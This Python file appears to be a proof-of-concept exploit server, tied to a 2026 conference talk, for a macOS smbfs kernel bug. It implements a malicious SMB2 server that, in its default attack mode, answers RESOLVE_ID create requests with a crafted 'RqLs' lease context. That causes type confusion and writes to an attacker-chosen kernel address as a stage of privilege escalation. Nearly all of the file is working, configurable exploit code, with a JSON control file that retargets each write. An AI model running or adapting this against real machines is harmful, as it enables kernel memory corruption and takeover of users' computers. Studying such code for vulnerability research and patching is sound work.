#!/usr/bin/env python3
"""
smb_server.py -- malicious SMB 2/3 server that triggers the smbfs
create-context type confusion (stage 1; Black Hat USA 2026, Blazakis/Calif;
macOS 26.4.1 / 25E253, com.apple.filesystems.smbfs).

The bug (SMBClient/kernel/netsmb/smb_smb_2.c,
smb2_smb_parse_create_contexts(), case SMB2_CREATE_REQUEST_LEASE "RqLs"):

    dur_hndl_leasep = createp->create_contextp;   /* NO type check */
    if (dur_hndl_leasep->leasep == NULL) ...
    smbnode_lease_lock(dur_hndl_leasep->leasep, ...);
    if (lease_key_hi != leasep->lease_key_hi ||   /* K+0x30 */
        lease_key_low != leasep->lease_key_low)   /* K+0x38 */
        -> EBADRPC
    ...
    leasep->epoch       = server_epoch;           /* u16 write @ K+0x50 (v2) */
    leasep->lease_state = new_lease_state;        /* u32 write @ K+0x2c      */
    leasep->flags      |= SMB2_LEASE_GRANTED;     /* |= 0x80    @ K+0x20     */
    smbnode_lease_unlock(...);                    /* +0x10/+0x18 forced to 0 */

The response context dispatch is driven PURELY by the server-supplied
context *name*. When the client sent an AAPL RESOLVE_ID create context
(via fsgetpath() -> smbfs_vget -> smb2fs_smb_cmpd_resolve_id),
create_contextp points at

    struct smb2_create_ctx_resolve_id { uint64_t file_id; ... };

so leasep = resolve_id.file_id -- a value the *caller* of fsgetpath()
controls. If the server answers the resolve-id Create with an "RqLs"
context, the kernel treats the user-chosen file_id K as
"struct smb2_lease *" and performs the writes above at attacker-chosen
kernel address K. The lease keys in our response must equal the qwords
at K+0x30 / K+0x38 (known from the stage-0 webdav leak).

Wire facts baked in (verified against SMBClient source & 25E253 disasm):
  * Create-context entry: Next u32, NameOffset u16 (=16), NameLength u16
    (=4), Reserved u16, DataOffset u16 (=24), DataLength u32, Name 4 raw
    bytes ('AAPL' / 'RqLs'), u32 pad, data. Data read inline at offset 24.
  * AAPL SERVER_QUERY response data: u32 cmd=1, u32 pad, u64 reply_bitmap,
    [u64 server_caps] [u64 volume_caps] [u32 pad2, u32 len, UTF16 model].
  * AAPL RESOLVE_ID request data: u32 cmd=2, u32 pad, u64 file_id.
  * RqLs v2 response data (52 bytes): key_hi, key_low, lease_state u32,
    flags u32, duration u64, par_key_hi, par_key_low, epoch u16, rsvd u16.
  * CREATE response struct size 89; CreateContextsOffset is from the start
    of the SMB2 header and (offset - 64 - 88) pad bytes are skipped.
  * The resolve-id Create is COMPOUNDED with a Close (NextCommand chain);
    the response must be a compound Create+Close response.

Modes:
  attack (default): answer RESOLVE_ID creates with the RqLs confusion.
                    Lease keys/state/epoch come from the CLI (run.sh passes
                    values learned from the stage-0 leak / probes).
  safe:             answer RESOLVE_ID with a proper AAPL reply instead, so
                    the full client handshake can be smoke-tested WITHOUT
                    corrupting kernel memory (use this on non-victim hosts).

Stdlib only.
"""

import argparse
import json
import logging
import os
import socket
import socketserver
import struct
import sys
import time

LOG = logging.getLogger("smb-pwn")

# --------------------------------------------------------------------------
# constants
# --------------------------------------------------------------------------

SMB2_MAGIC = b"\xfeSMB"

SMB2_NEGOTIATE = 0x0000
SMB2_SESSION_SETUP = 0x0001
SMB2_LOGOFF = 0x0002
SMB2_TREE_CONNECT = 0x0003
SMB2_TREE_DISCONNECT = 0x0004
SMB2_CREATE = 0x0005
SMB2_CLOSE = 0x0006
SMB2_FLUSH = 0x0007
SMB2_READ = 0x0008
SMB2_WRITE = 0x0009
SMB2_LOCK = 0x000A
SMB2_IOCTL = 0x000B
SMB2_CANCEL = 0x000C
SMB2_ECHO = 0x000D
SMB2_QUERY_DIRECTORY = 0x000E
SMB2_CHANGE_NOTIFY = 0x000F
SMB2_QUERY_INFO = 0x0010
SMB2_SET_INFO = 0x0011
SMB2_OPLOCK_BREAK = 0x0012

STATUS_SUCCESS = 0x00000000
STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
STATUS_NOT_SUPPORTED = 0xC00000BB
STATUS_END_OF_FILE = 0xC0000011
STATUS_NO_SUCH_FILE = 0xC000000F

SMB2_FLAGS_SERVER_TO_REDIR = 0x00000001

SMB2_DIALECT_0311 = 0x0311
SMB2_DIALECT_0302 = 0x0302

SMB2_NEGOTIATE_SIGNING_ENABLED = 0x0001   # deliberately NOT "required"
SMB2_GLOBAL_CAP_LARGE_MTU = 0x00000004

SMB2_SESSION_FLAG_IS_GUEST = 0x0001

# create context names (raw bytes, compared as big-endian u32 by the client)
CTX_AAPL = b"AAPL"
CTX_RQLS = b"RqLs"

KAAPL_SERVER_QUERY = 1
KAAPL_RESOLVE_ID = 2
KAAPL_SERVER_CAPS = 0x01
KAAPL_VOLUME_CAPS = 0x02
KAAPL_MODEL_INFO = 0x04
KAAPL_SUPPORT_RESOLVE_ID = 0x01
# per smb_2.h doc example
AAPL_SERVER_CAPS = 0x01 | 0x02   # READ_DIR_ATTR | OSX_COPYFILE

NTLMSSP_CHALLENGE = 2
NTLMSSP_AUTHENTICATE = 3

SERVER_GUID = bytes.fromhex("00112233445566778899aabbccddeeff")

FILE_ATTR_DIRECTORY = 0x00000010
FILE_ATTR_ARCHIVE = 0x00000080


def filetime_now():
    return int((time.time() + 11644473600) * 10000000)


# --------------------------------------------------------------------------
# SPNEGO / NTLM helpers (server accepts anything)
# --------------------------------------------------------------------------

def _der_len(n):
    if n < 0x80:
        return bytes([n])
    if n < 0x100:
        return bytes([0x81, n])
    return bytes([0x82, n >> 8, n & 0xFF])


def _der(tag, content):
    return bytes([tag]) + _der_len(len(content)) + content


def spnego_neg_token_resp(state, token=b"", with_mech=True):
    inner = _der(0xA0, b"\x0a\x01" + bytes([state]))
    if with_mech:
        # supportedMech: 1.3.6.1.4.1.311.2.2.10 (NTLMSSP)
        inner += _der(0xA1, b"\x06\x09\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a")
    if token:
        inner += _der(0xA2, _der(0x04, token))
    return _der(0xA1, _der(0x30, inner))


def _av(av_id, text):
    data = text.encode("utf-16-le")
    return struct.pack("<H H", av_id, len(data)) + data


def ntlm_challenge():
    """Minimal NTLMSSP_CHALLENGE the macOS NTLM client accepts."""
    flags = (0x00000001      # NEGOTIATE_UNICODE
             | 0x00000004    # REQUEST_TARGET
             | 0x00000200    # NEGOTIATE_NTLM
             | 0x00020000    # TARGET_TYPE_SERVER
             | 0x00080000    # NEGOTIATE_EXTENDED_SESSIONSECURITY
             | 0x00200000    # NEGOTIATE_TARGET_INFO
             | 0x00800000    # NEGOTIATE_VERSION
             | 0x02000000)   # NEGOTIATE_128
    target = "POC".encode("utf-16-le")
    info = (_av(2, "WORKGROUP")     # MsvAvNbDomainName
            + _av(1, "POC-SRV")     # MsvAvNbComputerName
            + struct.pack("<H H", 7, 8) + struct.pack("<Q", filetime_now())
            + b"\x00\x00\x00\x00")  # MsvAvEOL
    name_off = 56
    info_off = name_off + len(target)
    out = b"NTLMSSP\x00"
    out += struct.pack("<I", NTLMSSP_CHALLENGE)
    out += struct.pack("<HHI", len(target), len(target), name_off)
    out += struct.pack("<I", flags)
    out += b"\xde\xad\xbe\xef\xca\xfe\xba\xbe"   # ServerChallenge
    out += b"\x00" * 8                            # Reserved
    out += struct.pack("<HHI", len(info), len(info), info_off)
    out += b"\x06\x01\x00\x1d\x00\x00\x00\x0f"   # Version 6.1
    out += target + info
    return out


def ntlm_msg_type(blob):
    i = blob.find(b"NTLMSSP\x00")
    if i < 0 or i + 12 > len(blob):
        return 0
    return struct.unpack_from("<I", blob, i + 8)[0]


# --------------------------------------------------------------------------
# SMB2 message plumbing
# --------------------------------------------------------------------------

class Smb2Header:
    __slots__ = ("command", "msg_id", "tree_id", "session_id", "flags",
                 "credit_charge", "credit_request", "next_command",
                 "body_off", "raw")

    def __init__(self, raw, off):
        (self.credit_charge, _status, self.command, self.credit_request,
         self.flags, self.next_command, self.msg_id, _reserved,
         self.tree_id, self.session_id) = struct.unpack_from(
            "<H I H H I I Q I I Q", raw, off + 6)
        self.body_off = off + 64
        self.raw = raw


def build_header(command, msg_id, session_id, tree_id, status, next_cmd=0,
                 credits=64):
    return struct.pack(
        "<4s H H I H H I I Q I I Q 16s",
        SMB2_MAGIC, 64, 0, status, command, credits,
        SMB2_FLAGS_SERVER_TO_REDIR, next_cmd, msg_id, 0, tree_id,
        session_id, b"\x00" * 16)


def align8(n):
    return (n + 7) & ~7


# --------------------------------------------------------------------------
# create-context building
# --------------------------------------------------------------------------

def build_context(name, data):
    """One SMB2_CREATE_CONTEXT: 24-byte header + data (DataOffset = 24)."""
    assert len(name) == 4
    hdr = struct.pack("<I H H H H I", 0, 16, 4, 0, 24, len(data))
    blob = hdr + name + b"\x00" * 4 + data
    blob += b"\x00" * (align8(len(blob)) - len(blob))
    return blob


def aapl_server_query_data():
    model = "Mac17,6".encode("utf-16-le")
    data = struct.pack("<I I Q", KAAPL_SERVER_QUERY, 0,
                       KAAPL_SERVER_CAPS | KAAPL_VOLUME_CAPS |
                       KAAPL_MODEL_INFO)
    data += struct.pack("<Q", AAPL_SERVER_CAPS)
    data += struct.pack("<Q", KAAPL_SUPPORT_RESOLVE_ID)
    data += struct.pack("<I I", 0, len(model)) + model
    return data


def aapl_resolve_id_data(path="poc-resolved"):
    p = path.encode("utf-16-le")
    return struct.pack("<I I I I", KAAPL_RESOLVE_ID, 0, STATUS_SUCCESS,
                       len(p)) + p


def rqls_lease_v2_data(key_hi, key_low, lease_state, epoch, lease_flags=0):
    return struct.pack("<Q Q I I Q Q Q H H",
                       key_hi, key_low, lease_state, lease_flags, 0,
                       0, 0, epoch, 0)


def rqls_lease_v1_data(key_hi, key_low, lease_state, lease_flags=0):
    return struct.pack("<Q Q I I Q", key_hi, key_low, lease_state,
                       lease_flags, 0)


# --------------------------------------------------------------------------
# the server
# --------------------------------------------------------------------------

class SmbState:
    def __init__(self, cfg):
        self.cfg = cfg
        self.session_id = 0x0000_4000_0000_0001
        self.tree_id = 1
        self.next_fid = 0x1000
        self.fids = {}          # fid -> is_dir
        self.got_resolve_id = None  # last file_id seen (the K target)


class SmbPwnHandler(socketserver.BaseRequestHandler):
    def setup(self):
        self.state = self.server.state
        self.buf = b""
        self.request.settimeout(120)

    # -- transport ---------------------------------------------------------

    def _recv_frame(self):
        while len(self.buf) < 4:
            chunk = self.request.recv(65536)
            if not chunk:
                return None
            self.buf += chunk
        ntype = self.buf[0]
        nlen = struct.unpack(">I", b"\x00" + self.buf[1:4])[0]
        if ntype == 0x81:   # NetBIOS session request (shouldn't happen on 445-style)
            self.request.sendall(b"\x82\x00\x00\x00")
            self.buf = self.buf[4 + nlen:]
            return self._recv_frame()
        while len(self.buf) < 4 + nlen:
            chunk = self.request.recv(65536)
            if not chunk:
                return None
            self.buf += chunk
        frame = self.buf[4:4 + nlen]
        self.buf = self.buf[4 + nlen:]
        return frame

    def _send_frame(self, payload):
        self.request.sendall(struct.pack(">I", len(payload)) + payload)

    # -- main loop ---------------------------------------------------------

    def handle(self):
        LOG.info("connection from %s:%d", *self.client_address)
        try:
            while True:
                frame = self._recv_frame()
                if frame is None:
                    break
                if frame[:4] == b"\xffSMB":
                    # SMB1 negotiate -> answer with SMB2 negotiate response
                    LOG.info("SMB1 negotiate seen, switching to SMB2")
                    resp = build_header(SMB2_NEGOTIATE, 0, 0, 0,
                                        STATUS_SUCCESS) + self._neg_body()
                    self._send_frame(resp)
                    continue
                if frame[:4] != SMB2_MAGIC:
                    LOG.warning("bad magic %r, dropping", frame[:4])
                    break
                responses = self._dispatch_frame(frame)
                if responses:
                    self._send_frame(self._build_compound(responses))
        except (ConnectionResetError, BrokenPipeError, socket.timeout):
            pass
        except Exception:
            LOG.exception("handler error")
        LOG.info("connection closed (%s:%d)", *self.client_address)

    def _dispatch_frame(self, frame):
        """Walk the (possibly compound) request chain; return response list.

        Each response is (command, msg_id, status, body)."""
        out = []
        off = 0
        while True:
            if off + 64 > len(frame):
                LOG.error("truncated compound header @%d", off)
                break
            hdr = Smb2Header(frame, off)
            body = frame[hdr.body_off:]
            nxt = hdr.next_command
            LOG.debug("cmd=0x%04x msgid=%d off=%d next=%d", hdr.command,
                      hdr.msg_id, off, nxt)
            resp = self._handle_command(hdr, body)
            if resp is not None:
                out.append(resp)
            if nxt == 0:
                break
            off += nxt
        return out

    def _build_compound(self, responses):
        payload = b""
        for i, (command, msg_id, status, body) in enumerate(responses):
            if i < len(responses) - 1:
                nxt = align8(64 + len(body))
            else:
                nxt = 0
            # session id is set once SESSION_SETUP starts; tree id only
            # from TREE_CONNECT on
            sid = 0 if command == SMB2_NEGOTIATE else self.state.session_id
            tid = self.state.tree_id if command not in (
                SMB2_NEGOTIATE, SMB2_SESSION_SETUP) else 0
            hdr = build_header(command, msg_id, sid, tid, status,
                               next_cmd=nxt)
            chunk = hdr + body
            chunk += b"\x00" * (align8(len(chunk)) - len(chunk))
            payload += chunk
        return payload

    # -- per-command handlers ----------------------------------------------

    def _handle_command(self, hdr, body):
        cmd = hdr.command
        if cmd == SMB2_NEGOTIATE:
            return (cmd, hdr.msg_id, STATUS_SUCCESS, self._neg_body())
        if cmd == SMB2_SESSION_SETUP:
            return self._session_setup(hdr, body)
        if cmd == SMB2_TREE_CONNECT:
            return (cmd, hdr.msg_id, STATUS_SUCCESS, self._tree_connect_body())
        if cmd == SMB2_CREATE:
            return self._create(hdr, body)
        if cmd == SMB2_CLOSE:
            return (cmd, hdr.msg_id, STATUS_SUCCESS, self._close_body())
        if cmd == SMB2_QUERY_INFO:
            return self._query_info(hdr, body)
        if cmd == SMB2_SET_INFO:
            return (cmd, hdr.msg_id, STATUS_SUCCESS, struct.pack("<H", 2))
        if cmd in (SMB2_LOGOFF, SMB2_TREE_DISCONNECT, SMB2_FLUSH, SMB2_LOCK,
                   SMB2_ECHO):
            return (cmd, hdr.msg_id, STATUS_SUCCESS,
                    struct.pack("<H H", 4, 0))
        if cmd == SMB2_READ:
            return (cmd, hdr.msg_id, STATUS_END_OF_FILE, b"")
        if cmd == SMB2_WRITE:
            count = struct.unpack_from("<I", body, 4)[0] if len(body) >= 8 else 0
            return (cmd, hdr.msg_id, STATUS_SUCCESS,
                    struct.pack("<H H I I H H", 17, 0, count, 0, 0, 0))
        if cmd == SMB2_QUERY_DIRECTORY:
            return (cmd, hdr.msg_id, STATUS_NO_SUCH_FILE, b"")
        if cmd in (SMB2_IOCTL, SMB2_CHANGE_NOTIFY):
            return (cmd, hdr.msg_id, STATUS_NOT_SUPPORTED, b"")
        if cmd in (SMB2_CANCEL, SMB2_OPLOCK_BREAK):
            return None     # no response expected
        LOG.warning("unhandled command 0x%04x", cmd)
        return (cmd, hdr.msg_id, STATUS_NOT_SUPPORTED, b"")

    # -- NEGOTIATE -----------------------------------------------------------

    def _neg_body(self):
        body = struct.pack(
            "<H H H H 16s I I I I Q Q H H I",
            65, SMB2_NEGOTIATE_SIGNING_ENABLED, SMB2_DIALECT_0311, 1,
            SERVER_GUID, SMB2_GLOBAL_CAP_LARGE_MTU,
            0x00100000, 0x00100000, 0x00100000,
            filetime_now(), filetime_now(),
            0, 0,          # security buffer offset/length: none
            128)           # negotiate context offset (64 hdr + 64 body)
        # SMB2_PREAUTH_INTEGRITY_CAPABILITIES, SHA-512, 32-byte salt
        body += struct.pack("<H H I H H H", 1, 38, 0, 1, 32, 1)
        body += bytes(range(32))
        return body

    # -- SESSION_SETUP -------------------------------------------------------

    def _session_setup(self, hdr, body):
        sec_off, sec_len = struct.unpack_from("<H H", body, 12)
        blob = body[sec_off - 64: sec_off - 64 + sec_len] if sec_len else b""
        raw_ntlm = blob.startswith(b"NTLMSSP\x00")
        mtype = ntlm_msg_type(blob)
        LOG.info("SESSION_SETUP (NTLM msg type %d, blob %d bytes, raw=%d)",
                 mtype, len(blob), raw_ntlm)
        LOG.info("  req blob: %s", blob.hex())
        if mtype == NTLMSSP_AUTHENTICATE:
            if raw_ntlm:
                out = b""
            else:
                out = spnego_neg_token_resp(0, with_mech=False)  # accept-completed
            status = STATUS_SUCCESS
        else:
            if raw_ntlm:
                out = ntlm_challenge()
            else:
                out = spnego_neg_token_resp(1, ntlm_challenge())  # incomplete
            status = STATUS_MORE_PROCESSING_REQUIRED
        LOG.info("  rsp blob: %s", out.hex())
        off = 64 + 8
        rbody = struct.pack("<H H H H", 9, SMB2_SESSION_FLAG_IS_GUEST,
                            off, len(out)) + out
        return (SMB2_SESSION_SETUP, hdr.msg_id, status, rbody)

    # -- TREE_CONNECT ----------------------------------------------------------

    def _tree_connect_body(self):
        return struct.pack("<H B B I I I", 16, 1, 0, 0, 0, 0x001F01FF)

    # -- CLOSE -----------------------------------------------------------------

    def _close_body(self):
        return struct.pack("<H H I Q Q Q Q Q Q I I", 60, 0, 0,
                           filetime_now(), filetime_now(), filetime_now(),
                           filetime_now(), 0, 0, FILE_ATTR_DIRECTORY, 0)

    # -- CREATE ------------------------------------------------------------------

    def _create(self, hdr, body):
        name_off, name_len = struct.unpack_from("<H H", body, 44)
        ctx_off, ctx_len = struct.unpack_from("<I I", body, 48)
        raw_name = b""
        if name_len and name_off:
            raw_name = body[name_off - 64: name_off - 64 + name_len]
        try:
            name = raw_name.decode("utf-16-le", "replace")
        except Exception:
            name = repr(raw_name)
        is_dir = ("." not in name)

        aapl_cmd = None
        file_id = None
        off = ctx_off
        end = ctx_off + ctx_len
        while ctx_len and off and off + 24 <= end + 24 and off + 24 <= len(body) + 64:
            cbase = off - 64
            if cbase < 0 or cbase + 16 > len(body):
                break
            nxt, noff, nlen, _rsv, doff, dlen = struct.unpack_from(
                "<I H H H H I", body, cbase)
            cname = body[cbase + noff: cbase + noff + nlen]
            data = body[cbase + doff: cbase + doff + dlen]
            if cname == CTX_AAPL and len(data) >= 4:
                aapl_cmd = struct.unpack_from("<I", data, 0)[0]
                if aapl_cmd == KAAPL_RESOLVE_ID and len(data) >= 16:
                    file_id = struct.unpack_from("<Q", data, 8)[0]
            if nxt == 0:
                break
            off += nxt

        fid = self.state.next_fid
        self.state.next_fid += 1
        self.state.fids[fid] = is_dir

        ctx_blob = b""
        if aapl_cmd == KAAPL_SERVER_QUERY:
            LOG.info("CREATE %r: AAPL SERVER_QUERY -> OSX server caps", name)
            ctx_blob = build_context(CTX_AAPL, aapl_server_query_data())
        elif aapl_cmd == KAAPL_RESOLVE_ID:
            self.state.got_resolve_id = file_id
            LOG.info("CREATE %r: AAPL RESOLVE_ID file_id(K)=0x%016x",
                     name, file_id)
            if self.state.cfg.mode == "safe":
                LOG.info("  safe mode: answering with a real AAPL reply")
                ctx_blob = build_context(CTX_AAPL, aapl_resolve_id_data())
            else:
                cfg = self.state.cfg
                # Per-request override: the exploit rewrites the control file
                # between fsgetpath() calls so every confusion write can have
                # different keys (matching the current target's memory).
                if cfg.ctl_file and os.path.exists(cfg.ctl_file):
                    try:
                        with open(cfg.ctl_file) as f:
                            ctl = json.load(f)
                        num = lambda v, d: (int(str(v), 0) if v is not None
                                            else d)
                        cfg.lease_key_hi = num(ctl.get("lease_key_hi"),
                                               cfg.lease_key_hi)
                        cfg.lease_key_low = num(ctl.get("lease_key_low"),
                                                cfg.lease_key_low)
                        cfg.lease_state = num(ctl.get("lease_state"),
                                              cfg.lease_state)
                        cfg.epoch = num(ctl.get("epoch"), cfg.epoch)
                        cfg.lease_v1 = bool(ctl.get("lease_v1",
                                                    cfg.lease_v1))
                    except Exception as e:
                        LOG.error("ctl file %s: %s (using previous values)",
                                  cfg.ctl_file, e)
                LOG.info("  ATTACK: answering with RqLs lease ctx "
                         "(keys=%016x:%016x state=0x%x epoch=0x%x)",
                         cfg.lease_key_hi, cfg.lease_key_low,
                         cfg.lease_state, cfg.epoch)
                if cfg.lease_v1:
                    data = rqls_lease_v1_data(cfg.lease_key_hi,
                                              cfg.lease_key_low,
                                              cfg.lease_state)
                else:
                    data = rqls_lease_v2_data(cfg.lease_key_hi,
                                              cfg.lease_key_low,
                                              cfg.lease_state, cfg.epoch)
                ctx_blob = build_context(CTX_RQLS, data)
        else:
            LOG.info("CREATE %r (dir=%d) fid=0x%x", name, is_dir, fid)

        ctx_offset = (64 + 88) if ctx_blob else 0
        now = filetime_now()
        attrs = FILE_ATTR_DIRECTORY if is_dir else FILE_ATTR_ARCHIVE
        rbody = struct.pack(
            "<H B B I Q Q Q Q Q Q I I Q Q I I",
            89, 0, 0, 1,                 # struct size, oplock NONE, action
            now, now, now, now,          # times
            0x1000, 0,                   # alloc size, eof
            attrs, 0,                    # attributes, reserved
            fid, fid,                    # persistent / volatile fid
            ctx_offset, len(ctx_blob))
        rbody += ctx_blob
        return (SMB2_CREATE, hdr.msg_id, STATUS_SUCCESS, rbody)

    # -- QUERY_INFO ------------------------------------------------------------

    def _query_info(self, hdr, body):
        itype, iclass = body[2], body[3]
        fid = struct.unpack_from("<Q", body, 24)[0] if len(body) >= 32 else 0
        is_dir = self.state.fids.get(fid, True)
        now = filetime_now()
        attrs = FILE_ATTR_DIRECTORY if is_dir else FILE_ATTR_ARCHIVE
        data = None

        if itype == 2:      # SMB2_0_INFO_FILESYSTEM
            if iclass == 1:    # FileFsVolumeInformation
                label = "POC".encode("utf-16-le")
                data = struct.pack("<Q I I", now, 0xDEADBEEF,
                                   len(label)) + label
            elif iclass == 3:  # FileFsSizeInformation
                data = struct.pack("<Q Q I I", 0x40000000, 0x20000000,
                                   8, 512)
            elif iclass == 4:  # FileFsDeviceInformation
                data = struct.pack("<I I", 0x00000007, 0x00000000)
            elif iclass == 5:  # FileFsAttributeInformation
                fsname = "NTFS".encode("utf-16-le")
                data = struct.pack("<I i I", 0x0004000E, 255,
                                   len(fsname)) + fsname
            elif iclass == 7:  # FileFsFullSizeInformation
                data = struct.pack("<Q Q Q I I", 0x40000000, 0x20000000,
                                   0x20000000, 8, 512)
        elif itype == 1:    # SMB2_0_INFO_FILE
            if iclass == 4:    # FileBasicInformation
                data = struct.pack("<Q Q Q Q I I", now, now, now, now,
                                   attrs, 0)
            elif iclass == 5:  # FileStandardInformation
                data = struct.pack("<Q Q I B B H", 0x1000, 0, 1, 0,
                                   1 if is_dir else 0, 0)
            elif iclass == 6:  # FileInternalInformation
                data = struct.pack("<Q", 1)
            elif iclass == 18:  # FileAllInformation
                data = struct.pack("<Q Q Q Q I I", now, now, now, now,
                                   attrs, 0)                     # basic
                data += struct.pack("<Q Q I B B H", 0x1000, 0, 1, 0,
                                    1 if is_dir else 0, 0)       # standard
                data += struct.pack("<Q", 1)                     # internal
                data += struct.pack("<I", 0)                     # ea
                data += struct.pack("<I", 0x001F01FF)            # access
                data += struct.pack("<Q", 0)                     # position
                data += struct.pack("<I", 0)                     # mode
                data += struct.pack("<I", 0)                     # alignment
                data += struct.pack("<I", 0)                     # name len
            elif iclass == 34:  # FileNetworkOpenInformation
                data = struct.pack("<Q Q Q Q Q Q I I", now, now, now, now,
                                   0x1000, 0, attrs, 0)
            elif iclass == 35:  # FileAttributeTagInformation
                data = struct.pack("<I I", attrs, 0)

        if data is None:
            LOG.info("QUERY_INFO type=%d class=%d -> NOT_SUPPORTED", itype,
                     iclass)
            return (SMB2_QUERY_INFO, hdr.msg_id, STATUS_NOT_SUPPORTED, b"")
        LOG.info("QUERY_INFO type=%d class=%d -> %d bytes", itype, iclass,
                 len(data))
        rbody = struct.pack("<H H I", 9, 72, len(data)) + data
        return (SMB2_QUERY_INFO, hdr.msg_id, STATUS_SUCCESS, rbody)


class ThreadingSMBServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="Malicious SMB2 server triggering the smbfs RqLs "
                    "create-context type confusion.")
    ap.add_argument("--bind", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=1445,
                    help="listen port (default 1445; unprivileged)")
    ap.add_argument("--mode", choices=["attack", "safe"], default="attack",
                    help="'safe' answers RESOLVE_ID properly (no kernel "
                         "write) for handshake testing on non-victim hosts")
    ap.add_argument("--lease-key-hi", type=lambda s: int(s, 0), default=0,
                    help="must equal *(K+0x30) learned from the leak")
    ap.add_argument("--lease-key-low", type=lambda s: int(s, 0), default=0,
                    help="must equal *(K+0x38) learned from the leak")
    ap.add_argument("--lease-state", type=lambda s: int(s, 0),
                    default=0x41414141,
                    help="u32 written to K+0x2c")
    ap.add_argument("--epoch", type=lambda s: int(s, 0), default=0x4242,
                    help="u16 written to K+0x50 (v2)")
    ap.add_argument("--lease-v1", action="store_true",
                    help="send 32-byte v1 lease response (no epoch write)")
    ap.add_argument("--ctl", default="/tmp/lpe-smb-ctl.json",
                    help="JSON control file re-read before every RESOLVE_ID "
                         "attack response (lease_key_hi/lease_key_low/"
                         "lease_state/epoch/lease_v1); '' disables")
    args = ap.parse_args(argv)
    args.ctl_file = args.ctl or None

    logging.basicConfig(level=logging.INFO,
                        format="%(asctime)s %(name)s: %(message)s")

    srv = ThreadingSMBServer((args.bind, args.port), SmbPwnHandler)
    srv.state = SmbState(args)
    LOG.info("SMB2 server on %s:%d mode=%s "
             "(keys=%016x:%016x state=0x%x epoch=0x%x%s)",
             args.bind, args.port, args.mode, args.lease_key_hi,
             args.lease_key_low, args.lease_state, args.epoch,
             " v1" if args.lease_v1 else " v2")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        srv.server_close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
